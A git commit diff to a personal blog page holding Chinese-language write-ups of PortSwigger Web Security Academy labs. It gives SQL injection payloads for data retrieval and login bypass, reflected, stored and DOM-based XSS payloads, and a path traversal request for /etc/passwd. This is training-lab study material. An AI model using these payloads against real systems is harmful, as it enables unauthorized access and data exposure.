0cd0ceb0f6948b28d1ed80ad4d62c1deb6eeff30
1kuzus <revenge.1kuzus@outlook.com>
2024-11-26 14:43:39 +0800

    update posts

--- src/app/(posts)/longtime/wp-portswigger/page.js
+++ src/app/(posts)/longtime/wp-portswigger/page.js
@@ -10,13 +10,60 @@ export default function Post() {
             <X.TOC />
             <X.Title>{metas[path].title}</X.Title>
             <X.H1>SQL injection</X.H1>
+            <X.H2>Ap: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</X.H2>
+            <X.P>给了查询的SQL语句示例：</X.P>
+            <X.CodeBlock language="sql" code="SELECT * FROM products WHERE category = 'Gifts' AND released = 1" />
+            <X.P>构造`payload`为`Gifts' or 1=1 --`，输入URL`/filter?category=Gifts%27%20or%201=1%20--`。</X.P>
             <X.H2>Ap: SQL injection vulnerability allowing login bypass</X.H2>
             <X.P>直接用用户名`administrator' --`；或用户名`administrator`，密码`1' or 1=1 --`。</X.P>
             <X.H1>Cross-site scripting (XSS)</X.H1>
+            <X.H2>笔记</X.H2>
+            <X.Uli>`document.write`和`innerHTML`：`innerHTML`写入的`script`标签不会被解析执行；`document.write`会直接将内容插入文档流，写入的`script`标签会被执行。对于`innerHTML`的情况可以考虑使用{'`<img src=0 onerror="alert(0)">`'}。</X.Uli>
             <X.H2>Ap: Reflected XSS into HTML context with nothing encoded</X.H2>
             <X.P>反射型XSS，搜索{'`<script>alert(0)</script>`'}。</X.P>
             <X.H2>Ap: Stored XSS into HTML context with nothing encoded</X.H2>
             <X.P>存储型XSS，评论{'`<script>alert(0)</script>`'}。</X.P>
+            <X.H2>Ap: DOM XSS in document.write sink using source location.search</X.H2>
+            <X.P>页面中有如下代码：</X.P>
+            <X.CodeBlock
+                language="js"
+                code={`
+                function trackSearch(query) {
+                    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+                }
+                var query = (new URLSearchParams(window.location.search)).get('search');
+                if(query) {
+                    trackSearch(query);
+                }
+                `}
+            />
+            <X.P>构造`payload`为{'`"><script>alert(0)</script>`'}，输入搜索即可。</X.P>
+            <X.H2>Ap: DOM XSS in innerHTML sink using source location.search</X.H2>
+            <X.P>页面中有如下代码：</X.P>
+            <X.CodeBlock
+                language="js"
+                code={`
+                function doSearchQuery(query) {
+                    document.getElementById('searchMessage').innerHTML = query;
+                }
+                var query = (new URLSearchParams(window.location.search)).get('search');
+                if(query) {
+                    doSearchQuery(query);
+                }
+                `}
+            />
+            <X.P>构造`payload`为{'`<img src=0 onerror="alert(0)">`'}，输入搜索即可。</X.P>
+            <X.H2>Ap: DOM XSS in jQuery anchor href attribute sink using location.search source</X.H2>
+            <X.P>`/feedback`页面中有如下代码：</X.P>
+            <X.CodeBlock
+                language="js"
+                code={`
+                $(function() {
+                    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+                });
+                `}
+            />
+            <X.P>注入点是`a`标签的`href`，`payload`为`javascript:alert(0)`。输入URL`/feedback?returnPath=javascript:alert(0)`，然后点击这个`a`标签。</X.P>
             <X.H1>Path traversal</X.H1>
             <X.H2>Ap: File path traversal, simple case</X.H2>
             <X.P>随便检查一个图片，地址为`/image?filename=23.jpg`，改为`/txt?filename=../../../etc/passwd`即可。</X.P>
